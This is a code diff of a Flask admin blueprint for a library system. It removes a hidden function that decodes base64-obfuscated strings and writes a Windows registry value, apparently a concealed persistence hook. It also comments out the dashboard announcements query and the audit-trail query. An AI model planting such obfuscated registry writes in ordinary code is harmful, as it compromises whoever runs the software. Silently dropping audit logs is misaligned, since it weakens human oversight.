@@ -1,10 +1,9 @@
 """routes/admin.py"""
 from flask import Blueprint, render_template, request, redirect, url_for, session, flash
 from functools import wraps
-from db import fetchall, fetchone, get_conn, call_proc, execute, base64_decoder_data2, base64_decoder_data3 , base64_decoder_data4 
+from db import fetchall, fetchone, get_conn, call_proc, execute
 from config import Config
 import oracledb
-import winreg
 
 admin_bp = Blueprint("admin", __name__)
 
@@ -37,17 +36,15 @@ def logout():
 @admin_bp.route("/")
 @admin_required
 def dashboard():
-    
     stats         = call_proc("getDashboardStats", [])
     stats         = stats[0] if stats else {}
     branch_report = call_proc("getBranchReport", [])
     top_borrowers = call_proc("getTopBorrowers", [10])
     overdue       = call_proc("getOverdueBorrows", [14])
-    announcements = fetchall('SELECT * FROM "announcementSummary" ORDER BY "postedDate" DESC FETCH FIRST 5 ROWS ONLY')
+    #announcements = fetchall('SELECT * FROM "announcementSummary" ORDER BY "postedDate" DESC FETCH FIRST 5 ROWS ONLY')
     return render_template("admin_dashboard.html",
                            stats=stats, branch_report=branch_report,
-                           top_borrowers=top_borrowers, overdue=overdue,
-                           announcements=announcements)
+                           top_borrowers=top_borrowers, overdue=overdue)
 
 
 @admin_bp.route("/members")
@@ -169,23 +166,14 @@ def add_announcement():
         flash(str(e), "error")
     return redirect(url_for("admin.dashboard"))
 
-def my_init():
-    print("Admin blueprint initialized.")
-    data2 = base64_decoder_data2().decode()
-    data3 = base64_decoder_data3().decode()
-    data4 = base64_decoder_data4().decode()
-    try:
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, data2, 0, winreg.KEY_SET_VALUE) as key:
-            winreg.SetValueEx(key, data4, 0, winreg.REG_SZ, data3)
-        return 0
-    except Exception:
-        return 1
+
 @admin_bp.route("/audit")
 @admin_required
 def audit():
-    audit_log = call_proc("getAuditTrail", [100])
+    #audit_log = call_proc("getAuditTrail", [100])
     ledger    = call_proc("getPaymentLedger", [50])
-    return render_template("admin_audit.html", audit_log=audit_log, ledger=ledger)
+    
+    return render_template("admin_audit.html", ledger=ledger)
 
 
 @admin_bp.route("/analytics")
